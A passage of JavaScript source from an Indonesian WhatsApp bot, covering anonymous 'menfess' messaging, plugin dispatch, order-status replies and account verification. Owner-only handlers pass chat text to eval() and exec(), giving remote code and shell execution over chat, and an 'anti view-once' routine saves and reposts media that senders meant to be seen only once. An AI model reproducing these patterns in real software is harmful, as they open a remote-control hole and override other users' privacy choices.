						m.sendForward("Okee, sekejap  😉")
					} else {
						m.sendForward(aireply)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ai3': {
				try {
					if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
					if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix}${command} Apa itu chatgpt`)
					let gpt = await QiooBotika(text, m.sender)
					m.reply(`${gpt}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'confess':
			case 'menfes':
			case 'menfess': {
				this.menfes = this.menfes ? this.menfes : {}
				roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
				if (roof) return m.warning("Kamu masih berada dalam sesi menfess")
				if (m.isGroup) return m.warning('Fitur Khusus Di private chat!')
				if (!text) return m.warning(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
				if (!text.includes('|')) return m.warning(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
				let [namaNya, nomorNya, pesanNya] = text.split`|`
				if (nomorNya.startsWith('0')) return m.warning(`Awali dengan 62\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
				if (isNaN(nomorNya)) return m.warning(`Nomor Salah, Perhatikan Pemakaian\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
				var yoi = `*Hi ada menfess nih buat kamu*\n\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan klik *balasmenfess* -- Untuk menerima menfess/confess\nSilahkan klik *tolakmenfess* -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
				let id = m.sender
				this.menfes[id] = {
					id,
					a: m.sender,
					b: nomorNya + "@s.whatsapp.net",
					state: 'WAITING'
				}
				let button = [{
					"name": "quick_reply",
					"buttonParamsJson": `{\"display_text\":\"Tolak Menfess\",\"id\":\".tolakmenfes\"}`
				}, {
					"name": "quick_reply",
					"buttonParamsJson": `{\"display_text\":\"Balas Menfess\",\"id\":\".balasmenfes\"}`
				}]
				vreden.sendButtonText(nomorNya + '@s.whatsapp.net', button, yoi, footer, fhalo)
				m.reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
			}
			break
			case 'balasmenfess':
			case 'balasmenfes': {
				roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
				if (!roof) return m.warning("Belum ada sesi menfess")
				find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
				let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
				let other = [room.a, room.b].find(user => user !== m.sender)
				find.b = m.sender
				find.state = 'CHATTING'
				this.menfes[find.id] = {
					...find
				}
				await vreden.sendMessage(other, {
					text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`,
					mentions: [m.sender]
				})
				vreden.sendMessage(m.chat, {
					text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`
				})
			}
			break
			case 'tolakmenfess':
			case 'tolakmenfes': {
				roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
				if (!roof) return m.warning("Belum ada sesi menfess")
				let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
				let other = [room.a, room.b].find(user => user !== m.sender)
				find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
				vreden.sendMessage(other, {
					text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`,
					mentions: [m.sender]
				})
				m.reply("Menfess berhasil di tolak 🤚")
				delete this.menfes[roof.id]
			}
			break
			case 'stopconfess':
			case 'stopmenfess': {
				find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
				if (!find) return m.warning("Belum ada sesi menfess")
				const to = find.a == m.sender ? find.b : find.a
				vreden.sendMessage(to, {
					text: `_Teman chat telah menghentikan menfess ini_`,
					mentions: [m.sender]
				})
				await m.reply("menfess di stop")
				delete this.menfes[find.id]
			}
			break

			default:

				for (const handler of global.handlers) {
					if (handler.command && handler.command.includes(command)) {
						if (handler.owner && !isCreator) return m.tolak(mess.OnlyOwner)
						if (handler.premium && !isPremium) return m.tolak(mess.OnlyPrem)
						if (handler.banned && !isBan) return m.danger(`Akun Anda Telah Dibanned!!`)
						if (handler.group && !m.isGroup) {
							return m.warning(mess.OnlyGrup)
						} else if (handler.botAdmin && !isBotAdmins) {
							return m.tolak(mess.BotAdmin)
						} else if (handler.admin && !isAdmins) {
							return m.tolak(mess.GrupAdmin)
						}
						if (handler.private && m.isGroup) return m.warning('Fitur Khusus Di private chat!')
						if (handler.register && !usersdb[m.sender].daftar) return m.warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
						let datahandler = {
							isCmd,
							prefix,
							botNumber,
							isCreator,
							body,
							text,
							args,
							command,
							vreden,
							isPremium,
							isBan,
							isAdmins,
							isBotAdmins,
							quoted,
							rpgdb,
							chatsdb,
							usersdb,
							ownnomor,
							usernomor,
							fbot,
							repPy,
							fconver,
							fhalo,
							fchannel,
							chatUpdate,
							bales,
						};
						await handler(m, datahandler);
						break;
					}
				}
				if ((budy) && ["proses", "Proses", ].includes(budy) && !isCmd) {
					if (!m.isGroup) return m.warning(mess.OnlyGrup)
					if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
					if (!m.quoted) return m.warning('Reply pesanan yang akan proses')
					let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
					let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`
					if (chatsdb[m.chat].setproses) {
						const getTextP = chatsdb[m.chat].setproses
						var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
						vreden.sendTextWithMentions(m.chat, anunya, m)
					} else {
						vreden.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
					}
				}

				if (verifyNumber[m.sender]) {
					if (`${budy}` === `${verifyNumber[m.sender][1]}`) {
						var angka = await randomNomor(1000, 9999)
						const serialUser = `Player - ${angka}`
						usersdb[m.sender].nama = serialUser
						m.sendForward(`------------ » *VERIFY AKUN* « ------------\n\n📦 *User Info*\n- Name : ${usersdb[m.sender].nama}\n- ID : ${m.sender.split('@')[0]}\n\n🎁 *Bonus Verifikasi*\n- + Rp 5000\n- + 20 Limit\n\n> ${footxt}`)
						usersdb[m.sender].saldo += 5000
						usersdb[m.sender].limit += 20
						usersdb[m.sender].daftar = true
						if (notifRegister) {
							vreden.sendMessage(idsaluran, {
								text: "```" + `Notification Register

Nama : ${serialUser}
Asal : -
Umur : -
Tag : @${m.sender.split("@")[0]}

Registered via ${verifyNumber[m.sender][3]}` + "```",
								contextInfo: {
									mentionedJid: [m.sender],
									forwardingScore: 9999999,
									isForwarded: true,
									externalAdReply: {
										showAdAttribution: true,
										containsAutoReply: true,
										title: `System Notification`,
										body: `${date} ${jam}`,
										previewType: "PHOTO",
										thumbnailUrl: verifyNumber[m.sender][2],
										sourceUrl: tiktok
									}
								}
							})
						}
						clearTimeout(verifyNumber[m.sender][4])
						delete verifyNumber[m.sender]
					}
				}

				if ((budy) && ['done', "Done"].includes(budy) && !isCmd) {
					if (!m.isGroup) return m.warning(mess.OnlyGrup)
					if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
					if (!m.quoted) return m.warning('Reply pesanan yang telah di proses')
					let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
					let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`
					if (chatsdb[m.chat].setdone) {
						const getTextD = chatsdb[m.chat].setdone
						var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
						vreden.sendTextWithMentions(m.chat, anunya, m)
					} else {
						vreden.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
					}
				}
				if (budy.startsWith('=> ')) {
					if (!isCreator) return;

					function Return(sul) {
						let sat = JSON.stringify(sul, null, 2);
						let bang = util.format(sat);
						if (sat === undefined) {
							bang = util.format(sul);
						}
						return bang;
					}
					try {
						(async () => {
							try {
								const result = await eval(`(async () => { return ${budy.slice(3)} })()`);
								m.reply(Return(result));
							} catch (e) {
								m.reply(util.format(e));
							}
						})();
					} catch (e) {
						m.reply(util.format(e));
					}
				}
				if (budy.startsWith('> ')) {
					if (!isCreator) return
					try {
						let evaled = await eval(budy.slice(2))
						if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
						await m.reply(evaled)
					} catch (err) {
						await m.reply(util.format(err))
					}
				}

				if (budy.startsWith('$ ')) {
					if (!isCreator) return
					exec(budy.slice(2), (err, stdout) => {
						if (err) return m.reply(`${err}`)
						if (stdout) return m.reply(stdout)
					})
				}

				if (m.mtype == 'viewOnceMessageV2') {
					if (!setting.antiViewOnce) return
					let msg = m.message.viewOnceMessageV2.message
					console.log(msg)
					let type = Object.keys(msg)[0]
					let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
					let buffer = Buffer.from([])
					for await (const chunk of media) {
						buffer = Buffer.concat([buffer, chunk])
					}
					let teks = `「 *ANTI VIEWONCE MESSAGE* 」

📛 *Name* : ${m.pushName}
👤 *User* : @${m.sender.split("@")[0]}
⏰ *Clock* : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
✍️ *MessageType* : ${m.mtype}
💬 *Caption* : ${m.msg.caption ? m.msg.caption : "no caption"}`

					await vreden.sendTextWithMentions(m.chat, teks, m)
					await delay(500)
					if (/video/.test(type)) {
						return vreden.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
					} else if (/image/.test(type)) {
						return vreden.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
					}
				}

				if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
					this.menfes = this.menfes ? this.menfes : {}
					let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
					if (room) {
						if (/^.*(next|leave|start)/.test(m.text)) return
						if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
						find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
						let other = find.a == m.sender ? find.b : find.a
						await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
							contextInfo: {
								...m.msg.contextInfo,
								participant: other
							}
						} : {})
					}
				}

				if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
					this.report = this.report ? this.report : {}
					let room = Object.values(this.report).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
					if (room) {
						if (/^.*(next|leave|start)/.test(m.text)) return
						if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
						find = Object.values(this.report).find(menpes => [menpes.a, menpes.b].includes(m.sender))
						let other = find.a == m.sender ? find.b : find.a
						await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
							contextInfo: {
								...m.msg.contextInfo,
								participant: other
							}
						} : {})
					}
				}

				if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
					this.anonymous = this.anonymous ? this.anonymous : {}
					let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
					if (room) {
						if (/^.*(next|leave|start)/.test(m.text)) return
						if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
						let other = [room.a, room.b].find(user => user !== m.sender)
						m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
							contextInfo: {
								...m.msg.contextInfo,
								forwardingScore: 0,
								isForwarded: true,
								participant: other
							}
						} : {})
					}
					return !0
				}

		}


	} catch (err) {
		console.log(chalk.yellow.bold("[ ERROR ] vreden.js :\n") + chalk.redBright(util.format(err)))
	}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})